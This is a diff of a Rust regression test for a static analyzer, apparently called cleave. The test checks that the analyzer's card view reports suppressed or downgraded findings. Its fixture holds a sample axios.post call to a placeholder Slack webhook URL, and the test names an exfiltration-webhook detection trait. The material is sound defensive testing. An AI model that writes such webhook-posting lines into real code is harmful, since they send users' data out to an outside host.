@@ -1,14 +1,12 @@
 //! Regression guard: the card view (scan's compact terminal render) must show
-//! what the analysis decided *not* to report. The tiny view (the payload
-//! `scan --format interpret` prints verbatim) does not: it draws annotations
-//! only beside the code they describe, and a withheld pattern has none.
+//! what the analysis decided *not* to report.
 //!
 //! A reader that only sees the findings cannot tell a clean file from a
 //! suppressed one, and the suppressor is the interesting half — a credential
 //! path withheld because the file "looks like a test fixture" is a judgement
 //! worth checking, not a fact. Every `unless:`/`downgrade:` leg that withheld or
 //! demoted a notable-or-above trait is surfaced with the trait it acted on and
-//! the bytes it fired on, so a downstream grader can reach its own conclusion.
+//! the bytes it fired on, so a downstream reader can reach its own conclusion.
 #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
 
 use cleave::{AnalysisOptions, analyze_file};
@@ -23,7 +21,7 @@ axios.post("https://hooks.slack.com/services/T01234567/B01234567/abcdefghij", { 
 "#;
 
 #[test]
-fn tiny_output_reports_what_was_withheld_and_why() -> anyhow::Result<()> {
+fn card_output_reports_what_was_withheld_and_why() -> anyhow::Result<()> {
     // A path the shipped test-harness traits recognize, which is what makes the
     // suppressor legs fire — the point of the test is the suppression, not the
     // detection.
@@ -63,12 +61,7 @@ fn tiny_output_reports_what_was_withheld_and_why() -> anyhow::Result<()> {
         );
     }
 
-    // The card view must actually say so; the LLM view must not.
-    let tiny = cleave::output::format_tiny(&report);
-    assert!(
-        !tiny.contains("withheld") && !tiny.contains("downgraded"),
-        "the tiny payload draws no annotation without code; got:\n{tiny}",
-    );
+    // The card view must actually say so.
     let rendered = cleave::output::format_context(&report, &card());
     assert!(
         rendered.contains("withheld") || rendered.contains("downgraded"),
@@ -152,7 +145,7 @@ fn report_with_only_suppressions(
 /// Every recorded suppression must reach the card view, including on a file
 /// that has nothing else to show.
 ///
-/// The tiny view is a budget: it drops files with no selected findings, filters
+/// The context view is a budget: it drops files with no selected findings, filters
 /// by criticality, caps findings per file, and in focused mode skips files
 /// carrying nothing at focus grade. Each of those gates looked only at
 /// `findings`, so a file whose detections were *all* withheld rendered as
@@ -177,8 +170,6 @@ fn a_file_with_only_suppressions_still_reaches_the_payload() {
         }],
     }]);
 
-    let tiny = cleave::output::format_context(&report, &TinyOpts::tiny());
-    assert!(!tiny.contains("withheld"), "{tiny}");
     let rendered = cleave::output::format_context(&report, &card());
     assert!(
         rendered.contains("objectives/exfiltration/messaging/webhook::generic-webhook-url"),
